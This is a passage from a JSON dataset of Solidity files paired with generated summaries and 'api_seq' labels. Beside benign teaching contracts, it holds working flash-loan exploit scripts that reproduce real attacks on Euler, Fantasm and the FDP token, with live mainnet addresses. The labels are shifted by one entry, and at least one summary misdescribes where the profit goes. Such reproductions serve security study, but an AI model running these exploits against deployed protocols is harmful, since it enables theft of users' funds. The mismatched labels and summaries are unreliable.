        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.19;\n\n/**\n * @title EtherReceiver\n * @author pcaversaccio\n * @notice Forked and adjusted accordingly from here:\n * https://github.com/mds1/multicall/blob/master/src/test/mocks/EtherSink.sol.\n * @dev Allows to test receiving ether via low-level calls.\n */\ncontract EtherReceiver {\n    receive() external payable {}\n}\n",
        "summary": "This is a Solidity contract that allows testing of receiving Ether through low-level calls. It includes a receive function that is triggered whenever someone sends Ether to the contract address. The contract has a MIT license and requires Solidity version 0.8.19 to compile. The contract was forked from a GitHub repository and adjusted to meet specific needs.",
        "id": "e51a4d20-9ee4-439d-85d2-c109aab5b0dd",
        "api_seq": "EtherTransfer"
    },
    {
        "code": "pragma solidity ^0.5.0;\n\ncontract EtherTransferTo {\n    function () external payable {\n    }\n    \n    function getBalance() public returns (uint) {\n        return address(this).balance;\n    }\n}\n\ncontract EtherTransferFrom {\n    \n    EtherTransferTo private _instance;\n    \n    constructor() public {\n        // _instance = EtherTransferTo(address(this));\n        _instance = new EtherTransferTo();\n    }\n    \n    function getBalance() public returns (uint) {\n        return address(this).balance;\n    }\n    \n    function getBalanceOfInstance() public returns (uint) {\n        //return address(_instance).balance;\n        return _instance.getBalance();\n    }\n    \n    function () external payable {\n        //msg.sender.send(msg.value);\n        address(_instance).send(msg.value);\n    }\n}",
        "summary": "This code defines two smart contracts called EtherTransferTo and EtherTransferFrom. EtherTransferTo has a payable function to receive Ether and a function to return its own balance. EtherTransferFrom has a constructor function that creates an instance of EtherTransferTo, as well as functions to return its own balance and the balance of the instance of EtherTransferTo. EtherTransferFrom also has a payable function that sends any received Ether to the instance of EtherTransferTo.",
        "id": "9e05012d-0a3e-4108-889b-4c46505c8683",
        "api_seq": "Euler_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/FrankResearcher/status/1635241475989721089\n// https://twitter.com/nomorebear/status/1635230621856600064\n// https://twitter.com/peckshield/status/1635229594596036608\n// https://twitter.com/BlockSecTeam/status/1635262150624305153\n// https://twitter.com/SlowMist_Team/status/1635288963580825606\n// @TX\n// https://etherscan.io/tx/0xc310a0affe2169d1f6feec1c63dbc7f7c62a887fa48795d327d4d2da2d6b111d\n// @Summary\n// 1) Flash loan tokens from Balancer/Aave v2 => 30M DAI\n// 2) Deploy two contracts: violator and liquidator\n// 3) Deposit 2/3 of funds to Euler using deposit() => sent 20M DAI to Euler and received 19.5M eDAI from Euler\n// 4) Borrow 10x of deposited amount using mint() => received 195.6M eDAI and 200M dDAI from Euler\n// 5) Repay part of debt using the remaining 1/3 of funds using repay() => sent 10M DAI and burned 10M dDAI\n// 6) Repeat 4th step => received 195.6M eDAI and 200M dDAI from Euler\n// 7) Donate 10x of repaid funds using donateToReserves() => sent 100M eDAI to Euler\n// 8)  Liquidate a violator\u2019s account using liquidate() because eDAI < dDAI => received 310M eDAI and 259M dDAI of debt from the violator\n// 9) Withdraw all token amount from Euler using withdraw() => withdrew 38.9M DAI from Euler\n// 10) Repay flash loans\n\ninterface EToken {\n    function deposit(uint256 subAccountId, uint256 amount) external;\n    function mint(uint256 subAccountId, uint256 amount) external;\n    function donateToReserves(uint256 subAccountId, uint256 amount) external;\n    function withdraw(uint256 subAccountId, uint256 amount) external;\n}\n\ninterface DToken {\n    function repay(uint256 subAccountId, uint256 amount) external;\n}\n\ninterface IEuler {\n    struct LiquidationOpportunity {\n        uint256 repay;\n        uint256 yield;\n        uint256 healthScore;\n        uint256 baseDiscount;\n        uint256 discount;\n        uint256 conversionRate;\n    }\n\n    function liquidate(\n        address violator,\n        address underlying,\n        address collateral,\n        uint256 repay,\n        uint256 minYield\n    ) external;\n    function checkLiquidation(\n        address liquidator,\n        address violator,\n        address underlying,\n        address collateral\n    ) external returns (LiquidationOpportunity memory liqOpp);\n}\n\ncontract ContractTest is Test {\n    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);\n    EToken eDAI = EToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);\n    DToken dDAI = DToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);\n    IEuler Euler = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);\n    IAaveFlashloan AaveV2 = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);\n    address Euler_Protocol = 0x27182842E098f60e3D576794A5bFFb0777E025d3;\n    Iviolator violator;\n    Iliquidator liquidator;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 16_817_995);\n        cheats.label(address(DAI), \"DAI\");\n        cheats.label(address(eDAI), \"eDAI\");\n        cheats.label(address(dDAI), \"dDAI\");\n        cheats.label(address(Euler), \"Euler\");\n        cheats.label(address(AaveV2), \"AaveV2\");\n    }\n\n    function testExploit() public {\n        uint256 aaveFlashLoanAmount = 30_000_000 * 1e18;\n        address[] memory assets = new address[](1);\n        assets[0] = address(DAI);\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = aaveFlashLoanAmount;\n        uint256[] memory modes = new uint[](1);\n        modes[0] = 0;\n        bytes memory params =\n            abi.encode(30_000_000, 200_000_000, 100_000_000, 44_000_000, address(DAI), address(eDAI), address(dDAI));\n        AaveV2.flashLoan(address(this), assets, amounts, modes, address(this), params, 0);\n\n        emit log_named_decimal_uint(\"Attacker DAI balance after exploit\", DAI.balanceOf(address(this)), DAI.decimals());\n    }\n\n    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initator,\n        bytes calldata params\n    ) external returns (bool) {\n        DAI.approve(address(AaveV2), type(uint256).max);\n        violator = new Iviolator();\n        liquidator = new Iliquidator();\n        DAI.transfer(address(violator), DAI.balanceOf(address(this)));\n        violator.violator();\n        liquidator.liquidate(address(liquidator), address(violator));\n        return true;\n    }\n}\n\ncontract Iviolator {\n    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);\n    EToken eDAI = EToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);\n    DToken dDAI = DToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);\n    IEuler Euler = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);\n    address Euler_Protocol = 0x27182842E098f60e3D576794A5bFFb0777E025d3;\n\n    function violator() external {\n        DAI.approve(Euler_Protocol, type(uint256).max);\n        eDAI.deposit(0, 20_000_000 * 1e18);\n        eDAI.mint(0, 200_000_000 * 1e18);\n        dDAI.repay(0, 10_000_000 * 1e18);\n        eDAI.mint(0, 200_000_000 * 1e18);\n        eDAI.donateToReserves(0, 100_000_000 * 1e18);\n    }\n}\n\ncontract Iliquidator {\n    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);\n    EToken eDAI = EToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);\n    DToken dDAI = DToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);\n    IEuler Euler = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);\n    address Euler_Protocol = 0x27182842E098f60e3D576794A5bFFb0777E025d3;\n\n    function liquidate(address liquidator, address violator) external {\n        IEuler.LiquidationOpportunity memory returnData =\n            Euler.checkLiquidation(liquidator, violator, address(DAI), address(DAI));\n        Euler.liquidate(violator, address(DAI), address(DAI), returnData.repay, returnData.yield);\n        eDAI.withdraw(0, DAI.balanceOf(Euler_Protocol));\n        DAI.transfer(msg.sender, DAI.balanceOf(address(this)));\n    }\n}\n",
        "summary": "This code exploits a vulnerability in the Euler protocol, a DeFi platform. The steps of the exploit are as follows:\n\n1. 30 million DAI is flash borrowed from Aave v2 and deposited into the attacker's contract.\n2. Two contracts, violator and liquidator, are deployed.\n3. 20 million DAI is deposited into Euler protocol using the eDAI token. 19.5 million eDAI tokens are received in return.\n4. 200 million dDAI tokens and 195.6 million eDAI tokens are minted from Euler protocol using the deposited 19.5 million eDAI tokens as collateral.\n5. 10 million DAI and 10 million dDAI tokens are used to repay some of the debt.\n6. The previous step is repeated, resulting in receiving more eDAI and dDAI tokens.\n7. 100 million eDAI tokens are donated to Euler protocol as reserves.\n8. A violator's account is liquidated because they are in debt more than their balance. The attacker receives 310 million eDAI tokens and 259 million dDAI tokens of debt from the violator.\n9. All tokens are withdrawn from Euler protocol, resulting in 38.9 million DAI tokens being returned to the attacker.\n10. Flash loans are repaid.",
        "id": "32d30a2f-72c3-4292-98f6-d32d84764b62",
        "api_seq": "Event"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\ncontract Events {\n    // \u5b9a\u4e49_balances\u6620\u5c04\u53d8\u91cf\uff0c\u8bb0\u5f55\u6bcf\u4e2a\u5730\u5740\u7684\u6301\u5e01\u6570\u91cf\n    mapping(address => uint256) public _balances;\n\n    // \u5b9a\u4e49Transfer event\uff0c\u8bb0\u5f55transfer\u4ea4\u6613\u7684\u8f6c\u8d26\u5730\u5740\uff0c\u63a5\u6536\u5730\u5740\u548c\u8f6c\u8d26\u6570\u91cf\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n\n    // \u5b9a\u4e49_transfer\u51fd\u6570\uff0c\u6267\u884c\u8f6c\u8d26\u903b\u8f91\n    function _transfer(\n        address from,\n        address to,\n        uint256 amount\n    ) external {\n\n        _balances[from] = 10000000; // \u7ed9\u8f6c\u8d26\u5730\u5740\u4e00\u4e9b\u521d\u59cb\u4ee3\u5e01\n\n        _balances[from] -=  amount; // from\u5730\u5740\u51cf\u53bb\u8f6c\u8d26\u6570\u91cf\n        _balances[to] += amount; // to\u5730\u5740\u52a0\u4e0a\u8f6c\u8d26\u6570\u91cf\n\n        // \u91ca\u653e\u4e8b\u4ef6\n        emit Transfer(from, to, amount);\n    }\n}\n",
        "summary": "This is a Solidity smart contract that defines an event called \"Transfer\" and a function called \"_transfer\" that executes a transfer of tokens between two addresses and emits the \"Transfer\" event. The \"_balances\" mapping variable keeps track of the number of tokens held by each address. The code initializes the balance of the \"from\" address to 10000000 and deducts the transfer amount from that balance while adding it to the balance of the \"to\" address. The \"Transfer\" event records the transfer details including the addresses and the amount transferred. The code uses Solidity version 0.8.4 and is licensed under MIT.",
        "id": "40dfdd2c-ed77-4491-a92e-49afe1565586",
        "api_seq": "Exploit-template"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.15;\n\nimport \"forge-std/Script.sol\";\n\n// @KeyInfo - Total Lost : ~999M US$\n// Attacker : 0xcafebabe\n// Attack Contract : 0xdeadbeef\n// Vulnerable Contract : 0xdeadbeef\n// Attack Tx : 0x123456789\n\n// @Info\n// Vulnerable Contract Code : https://etherscan.io/address/0xdeadbeef#code\n\n// @Analysis\n// Post-mortem : https://www.google.com/\n// Twitter Guy : https://www.google.com/\n// Hacking God : https://www.google.com/\n\n\ncontract ExploitScript is Script {\n    function setUp() public {}\n\n    function run() public {\n        vm.startBroadcast();\n\n        \n        vm.stopBroadcast();\n    }\n}",
        "summary": "This code defines a Solidity contract called `ExploitScript`. It imports `Script.sol` from the Forge platform. The contract has a `setUp` function and a `run` function, but they are empty, and do not contain any operations. Therefore, this contract seems not to do anything particularly useful or harmful on its own. The code contains comments containing various information about the vulnerability, the attacker, and resources for further analysis and information.",
        "id": "59c97386-876e-4932-98c0-4bebb8817e78",
        "api_seq": "ExternalContract"
    },
    {
        "code": "pragma solidity ^0.5.0;\n\ncontract ExternalContract {\n    function externalCall(string calldata x) external returns (uint) {\n        return 123;\n    }\n    \n    function publicCall(string memory x) public returns (uint) {\n        return 123;\n    }\n}\n",
        "summary": "This Solidity contract includes two functions: \n\n1. `externalCall` - an `external` function that takes a string parameter and returns the integer value 123.\n\n2. `publicCall` - a `public` function that takes a string parameter and also returns the integer value 123. \n\nBoth functions have different function visibility types, with `externalCall` being an external function while `publicCall` is marked as public.",
        "id": "dcc9c490-d780-4dbc-8c23-30a03ce80144",
        "api_seq": "ExternalVsPublic"
    },
    {
        "code": "pragma solidity ^0.4.4;\n\ncontract MyContract {\n  function publicCalculate(uint[20] a) public returns (uint){\n       return a[10]*2;\n  }\n\n  function externalCalcuate(uint[20] a) external returns (uint){\n       return a[10]*2;\n  }\n}\n",
        "summary": "This code defines a smart contract called \"MyContract\" which includes two functions. The first function named \"publicCalculate\" is public and takes an array of 20 unsigned integers as input using the \"uint[20]\" data type. It returns the result of doubling the value of the element at index 10 of the input array. The second function named \"externalCalculate\" is external and takes the same input parameters and returns the same result as the \"publicCalculate\" function.",
        "id": "889d00a0-4b81-401c-a855-5b3e55b5f867",
        "api_seq": "Fallback"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\ncontract Fallback {\n    /* \u89e6\u53d1fallback() \u8fd8\u662f receive()?\n           \u63a5\u6536ETH\n              |\n         msg.data\u662f\u7a7a\uff1f\n            /  \\\n          \u662f    \u5426\n          /      \\\nreceive()\u5b58\u5728?   fallback()\n        / \\\n       \u662f  \u5426\n      /     \\\nreceive()  fallback   \n    */\n\n    // \u5b9a\u4e49\u4e8b\u4ef6\n    event receivedCalled(address Sender, uint Value);\n    event fallbackCalled(address Sender, uint Value, bytes Data);\n\n    // \u63a5\u6536ETH\u65f6\u91ca\u653eReceived\u4e8b\u4ef6\n    receive() external payable {\n        emit receivedCalled(msg.sender, msg.value);\n    }\n\n    // fallback\n    fallback() external payable{\n        emit fallbackCalled(msg.sender, msg.value, msg.data);\n    }\n}\n",
        "summary": "This is a Solidity smart contract that defines a fallback function and a receive function. The contract is used to receive transfers of Ether. When Ether is sent to the contract, the receive function is triggered and an event called receivedCalled is emitted including the address of the sender and the amount of Ether sent. If the contract receives any data along with the Ether transfer, the fallback function is triggered instead, and an event called fallbackCalled is emitted including the address of the sender, the amount of Ether sent, and any accompanying data. Both fallback and receive functions are defined as external and payable.",
        "id": "4473a41a-e98d-4b78-9714-da4ff9978cc4",
        "api_seq": "Fantasm_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract ContractTest is DSTest {\n    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    IERC20 fsm = IERC20(0xaa621D2002b5a6275EF62d7a065A865167914801);\n    IERC20 xFTM = IERC20(0xfBD2945D3601f21540DDD85c29C5C3CaF108B96F);\n    Pool pool = Pool(payable(0x880672AB1d46D987E5d663Fc7476CD8df3C9f937));\n    address attacker = 0x9362e8cF30635de48Bdf8DA52139EEd8f1e5d400;\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    \n    function setUp() public {\n        cheats.createSelectFork(\"fantom\", 32971742); //fork fantom block number 32971742\n        \n    }\n    function testExploit() public {\n\n        cheat.prank(0x9362e8cF30635de48Bdf8DA52139EEd8f1e5d400);\n        fsm.transfer(address(this), 100000000000000000000);\n        emit log_named_uint(\"Before exploit, xFTM  balance of attacker:\", xFTM.balanceOf(address(this)));\n        fsm.approve(address(pool), type(uint256).max);\n        pool.mint(100000000000000000000,1); // Due to the decimal error, the _xftmOut is bigger than it is supposed to be.\n        cheat.roll(32971743);\n        pool.collect();\n        emit log_named_uint(\"After exploit, xFTM  balance of attacker:\", xFTM.balanceOf(address(this)));\n}\n\n\n}",
        "summary": "This Solidity code is a test contract that tests an exploit. It imports some Solidity files and defines some contracts and variables. The `setUp()` function creates a select fork on the \"fantom\" blockchain, and the `testExploit()` function executes the exploit by calling `cheat.prank()`, transferring `fsm` tokens to the contract's address, and then interacting with the `pool` contract, causing a decimal error. The exploit is then completed by calling `pool.collect()` and checking the balance of `xFTM` before and after the exploit.",
        "id": "6a5880af-891a-43e2-99e0-5cc3af78df97",
        "api_seq": "Faucet"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// By 0xAA\npragma solidity ^0.8.4;\n\nimport \"./IERC20.sol\"; //import IERC20\n\ncontract ERC20 is IERC20 {\n\n    mapping(address => uint256) public override balanceOf;\n\n    mapping(address => mapping(address => uint256)) public override allowance;\n\n    uint256 public override totalSupply;   // \u4ee3\u5e01\u603b\u4f9b\u7ed9\n\n    string public name;   // \u540d\u79f0\n    string public symbol;  // \u7b26\u53f7\n    \n    uint8 public decimals = 18; // \u5c0f\u6570\u4f4d\u6570\n\n    constructor(string memory name_, string memory symbol_){\n        name = name_;\n        symbol = symbol_;\n    }\n\n    // @dev \u5b9e\u73b0`transfer`\u51fd\u6570\uff0c\u4ee3\u5e01\u8f6c\u8d26\u903b\u8f91\n    function transfer(address recipient, uint amount) external override returns (bool) {\n        balanceOf[msg.sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    // @dev \u5b9e\u73b0 `approve` \u51fd\u6570, \u4ee3\u5e01\u6388\u6743\u903b\u8f91\n    function approve(address spender, uint amount) external override returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    // @dev \u5b9e\u73b0`transferFrom`\u51fd\u6570\uff0c\u4ee3\u5e01\u6388\u6743\u8f6c\u8d26\u903b\u8f91\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint amount\n    ) external override returns (bool) {\n        allowance[sender][msg.sender] -= amount;\n        balanceOf[sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n\n    // @dev \u94f8\u9020\u4ee3\u5e01\uff0c\u4ece `0` \u5730\u5740\u8f6c\u8d26\u7ed9 \u8c03\u7528\u8005\u5730\u5740\n    function mint(uint amount) external {\n        balanceOf[msg.sender] += amount;\n        totalSupply += amount;\n        emit Transfer(address(0), msg.sender, amount);\n    }\n\n    // @dev \u9500\u6bc1\u4ee3\u5e01\uff0c\u4ece \u8c03\u7528\u8005\u5730\u5740 \u8f6c\u8d26\u7ed9  `0` \u5730\u5740\n    function burn(uint amount) external {\n        balanceOf[msg.sender] -= amount;\n        totalSupply -= amount;\n        emit Transfer(msg.sender, address(0), amount);\n    }\n\n}\n\n// ERC20\u4ee3\u5e01\u7684\u6c34\u9f99\u5934\u5408\u7ea6\ncontract Faucet {\n\n    uint256 public amountAllowed = 100; // \u6bcf\u6b21\u9886 100\u5355\u4f4d\u4ee3\u5e01\n    address public tokenContract;   // token\u5408\u7ea6\u5730\u5740\n    mapping(address => bool) public requestedAddress;   // \u8bb0\u5f55\u9886\u53d6\u8fc7\u4ee3\u5e01\u7684\u5730\u5740\n\n    // SendToken\u4e8b\u4ef6    \n    event SendToken(address indexed Receiver, uint256 indexed Amount); \n\n    // \u90e8\u7f72\u65f6\u8bbe\u5b9aERC2\u4ee3\u5e01\u5408\u7ea6\n    constructor(address _tokenContract) {\n        tokenContract = _tokenContract; // set token contract\n    }\n\n    // \u7528\u6237\u9886\u53d6\u4ee3\u5e01\u51fd\u6570\n    function requestTokens() external {\n        require(!requestedAddress[msg.sender], \"Can't Request Multiple Times!\"); // \u6bcf\u4e2a\u5730\u5740\u53ea\u80fd\u9886\u4e00\u6b21\n        IERC20 token = IERC20(tokenContract); // \u521b\u5efaIERC20\u5408\u7ea6\u5bf9\u8c61\n        require(token.balanceOf(address(this)) >= amountAllowed, \"Faucet Empty!\"); // \u6c34\u9f99\u5934\u7a7a\u4e86\n\n        token.transfer(msg.sender, amountAllowed); // \u53d1\u9001token\n        requestedAddress[msg.sender] = true; // \u8bb0\u5f55\u9886\u53d6\u5730\u5740 \n        \n        emit SendToken(msg.sender, amountAllowed); // \u91ca\u653eSendToken\u4e8b\u4ef6\n    }\n}\n",
        "summary": "This code defines an ERC20 token contract with functionalities such as transfer, approve, transferFrom, mint, and burn. It also defines a faucet contract which allows users to request tokens from the ERC20 token contract. The amount of tokens that can be requested is set by the amountAllowed variable, and requested addresses are tracked to prevent multiple requests from the same address.",
        "id": "dabc5268-61c6-43e7-a389-1c504ecdfb56",
        "api_seq": "FDP_exp.t"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\n\n// Attacker: 0x14d8ada7a0ba91f59dc0cb97c8f44f1d177c2195\n// Attack Contract: 0xdb2d869ac23715af204093e933f5eb57f2dc12a9\n// Vulnerable Contract: 0x1954b6bd198c29c3ecf2d6f6bc70a4d41ea1cc07\n// Attack Tx: https://phalcon.blocksec.com/tx/bsc/0x09925028ce5d6a54801d04ff8f39e79af6c24289e84b301ddcdb6adfa51e901b\n//            https://bscscan.com/tx/0x09925028ce5d6a54801d04ff8f39e79af6c24289e84b301ddcdb6adfa51e901b\n\n// @Analysis\n// https://twitter.com/BeosinAlert/status/1622806011269771266\n\ncontract Exploit is Test {\n    IWETH private constant WBNB = IWETH(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    reflectiveERC20 private constant FDP = reflectiveERC20(0x1954b6bd198c29c3ecF2D6F6bc70A4D41eA1CC07);\n    IUniswapV2Pair private constant FDP_WBNB = IUniswapV2Pair(0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3);\n\n    IRouter private constant router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    IDPPOracle private constant DPP = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);\n    \n    function testHack() external {\n        vm.createSelectFork(\"https://1rpc.io/bnb\", 25430418);\n\n        // flashloan 16.32 WBNB\n        DPP.flashLoan(16.32 ether, 0, address(this), \"0x1\");  \n    }\n\n    function DPPFlashLoanCall(address, uint256 baseAmount, uint256, bytes calldata) external {\n        // console.log(\"%s FDP in Pair before swap\", FDP.balanceOf(address(FDP_WBNB)) / 1e18);  // putting console.log here make test fail ?\n\n        // swap some WBNB to FDP\n        WBNB.approve(address(router), type(uint).max);\n        FDP.approve(address(router), type(uint).max);\n        address[] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(FDP);\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            16.32 ether,\n            0,\n            path, \n            address(this),\n            type(uint).max\n        );\n\n        console.log(\"%s FDP in Pair before deliver\", FDP.balanceOf(address(FDP_WBNB)) / 1e18);\n        console.log(\"%s FDP in attack contract before deliver\", FDP.balanceOf(address(this)) / 1e18);\n        console.log(\"-------------Delivering-------------\");\n                                      // 49925109590047580102880 in attack contract before deliver\n        FDP.deliver(28463.16 ether);  // 28463162603585437380302 (8 decimals)\n\n        console.log(\"%s FDP in Pair after deliver\", FDP.balanceOf(address(FDP_WBNB)) / 1e18);\n        console.log(\"%s FDP in attack contract after deliver\", FDP.balanceOf(address(this)) / 1e18);\n\n        FDP_WBNB.swap(\n            0,\n            WBNB.balanceOf(address(FDP_WBNB)) - 0.15 ether,  // 32.44 ether\n            address(this),\n            \"\"\n        );\n\n        // repay\n        WBNB.transfer(address(DPP), baseAmount);\n        console.log(\"\\n Attacker's profit: %s WBNB\", WBNB.balanceOf(address(this)) / 1e18);\n    }\n}\n\n/* -------------------- Interface -------------------- */\ninterface reflectiveERC20 {\n    function transfer(address to, uint256 amount) external returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n    function deliver(uint256 tAmount) external;\n}\n\ninterface IWETH {\n    function deposit() external payable;\n    function transfer(address to, uint256 value) external returns (bool);\n    function approve(address guy, uint256 wad) external returns (bool);\n    function withdraw(uint256 wad) external;\n    function balanceOf(address) external view returns (uint256);\n}\n\ninterface IDPPOracle {\n    function flashLoan(\n        uint256 baseAmount,\n        uint256 quoteAmount,\n        address sender,\n        bytes calldata data\n    ) external;\n}\n\ninterface IRouter {\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external;\n}\n\ninterface IUniswapV2Pair {\n    function balanceOf(address) external view returns (uint256);\n    function skim(address to) external;\n    function sync() external;\n    function swap(\n        uint256 amount0Out,\n        uint256 amount1Out,\n        address to,\n        bytes memory data\n    ) external;\n}",
        "summary": "This code defines a contract called Exploit that performs an attack on a vulnerable smart contract. The vulnerable contract is identified in the code and is exploited using a flash loan, followed by a swap of WBNB tokens for reflectiveERC20 tokens. The exploit is used to deliver a large amount of tokens to the attack contract's balance and then swap the tokens for more WBNB. The attack profits by receiving the difference in WBNB from the profit it made from the swap, which is then transferred back to the vulnerable contract to repay the flash loan.",
        "id": "000be362-063b-473b-9f1b-8bf3f75bd28a",
        "api_seq": "FixedPointMathLib"
    },
    {
        "code": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity >=0.8.0;\n\n/// @notice Arithmetic library with operations for fixed-point numbers.\n/// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/utils/FixedPointMathLib.sol)\n/// @author Inspired by USM (https://github.com/usmfum/USM/blob/master/contracts/WadMath.sol)\nlibrary FixedPointMathLib {\n    /*//////////////////////////////////////////////////////////////\n                    SIMPLIFIED FIXED POINT OPERATIONS\n    //////////////////////////////////////////////////////////////*/\n\n    uint256 internal constant MAX_UINT256 = 2**256 - 1;\n\n    uint256 internal constant WAD = 1e18; // The scalar of ETH and most ERC20s.\n\n    function mulWadDown(uint256 x, uint256 y) internal pure returns (uint256) {\n        return mulDivDown(x, y, WAD); // Equivalent to (x * y) / WAD rounded down.\n    }\n\n    function mulWadUp(uint256 x, uint256 y) internal pure returns (uint256) {\n        return mulDivUp(x, y, WAD); // Equivalent to (x * y) / WAD rounded up.\n    }\n\n    function divWadDown(uint256 x, uint256 y) internal pure returns (uint256) {\n        return mulDivDown(x, WAD, y); // Equivalent to (x * WAD) / y rounded down.\n    }\n\n    function divWadUp(uint256 x, uint256 y) internal pure returns (uint256) {\n        return mulDivUp(x, WAD, y); // Equivalent to (x * WAD) / y rounded up.\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                    LOW LEVEL FIXED POINT OPERATIONS\n    //////////////////////////////////////////////////////////////*/\n\n    function mulDivDown(\n        uint256 x,\n        uint256 y,\n        uint256 denominator\n    ) internal pure returns (uint256 z) {\n        /// @solidity memory-safe-assembly\n        assembly {\n            // Equivalent to require(denominator != 0 && (y == 0 || x <= type(uint256).max / y))\n            if iszero(mul(denominator, iszero(mul(y, gt(x, div(MAX_UINT256, y)))))) {\n                revert(0, 0)\n            }\n\n            // Divide x * y by the denominator.\n            z := div(mul(x, y), denominator)\n        }\n    }\n\n    function mulDivUp(\n        uint256 x,\n        uint256 y,\n        uint256 denominator\n    ) internal pure returns (uint256 z) {\n        /// @solidity memory-safe-assembly\n        assembly {\n            // Equivalent to require(denominator != 0 && (y == 0 || x <= type(uint256).max / y))\n            if iszero(mul(denominator, iszero(mul(y, gt(x, div(MAX_UINT256, y)))))) {\n                revert(0, 0)\n            }\n\n            // If x * y modulo the denominator is strictly greater than 0,\n            // 1 is added to round up the division of x * y by the denominator.\n            z := add(gt(mod(mul(x, y), denominator), 0), div(mul(x, y), denominator))\n        }\n    }\n\n    function rpow(\n        uint256 x,\n        uint256 n,\n        uint256 scalar\n    ) internal pure returns (uint256 z) {\n        /// @solidity memory-safe-assembly\n        assembly {\n            switch x\n            case 0 {\n                switch n\n                case 0 {\n                    // 0 ** 0 = 1\n                    z := scalar\n                }\n                default {\n                    // 0 ** n = 0\n                    z := 0\n                }\n            }\n            default {\n                switch mod(n, 2)\n                case 0 {\n                    // If n is even, store scalar in z for now.\n                    z := scalar\n                }\n                default {\n                    // If n is odd, store x in z for now.\n                    z := x\n                }\n\n                // Shifting right by 1 is like dividing by 2.\n                let half := shr(1, scalar)\n\n                for {\n                    // Shift n right by 1 before looping to halve it.\n                    n := shr(1, n)\n                } n {\n                    // Shift n right by 1 each iteration to halve it.\n                    n := shr(1, n)\n                } {\n                    // Revert immediately if x ** 2 would overflow.\n                    // Equivalent to iszero(eq(div(xx, x), x)) here.\n                    if shr(128, x) {\n                        revert(0, 0)\n                    }\n\n                    // Store x squared.\n                    let xx := mul(x, x)\n\n                    // Round to the nearest number.\n                    let xxRound := add(xx, half)\n\n                    // Revert if xx + half overflowed.\n                    if lt(xxRound, xx) {\n                        revert(0, 0)\n                    }\n\n                    // Set x to scaled xxRound.\n                    x := div(xxRound, scalar)\n\n                    // If n is even:\n                    if mod(n, 2) {\n                        // Compute z * x.\n                        let zx := mul(z, x)\n\n                        // If z * x overflowed:\n                        if iszero(eq(div(zx, x), z)) {\n                            // Revert if x is non-zero.\n                            if iszero(iszero(x)) {\n                                revert(0, 0)\n                            }\n                        }\n\n                        // Round to the nearest number.\n                        let zxRound := add(zx, half)\n\n                        // Revert if zx + half overflowed.\n                        if lt(zxRound, zx) {\n                            revert(0, 0)\n                        }\n\n                        // Return properly scaled zxRound.\n                        z := div(zxRound, scalar)\n                    }\n                }\n            }\n        }\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                        GENERAL NUMBER UTILITIES\n    //////////////////////////////////////////////////////////////*/\n\n    function sqrt(uint256 x) internal pure returns (uint256 z) {\n        /// @solidity memory-safe-assembly\n        assembly {\n            let y := x // We start y at x, which will help us make our initial estimate.\n\n            z := 181 // The \"correct\" value is 1, but this saves a multiplication later.\n\n            // This segment is to get a reasonable initial estimate for the Babylonian method. With a bad\n            // start, the correct # of bits increases ~linearly each iteration instead of 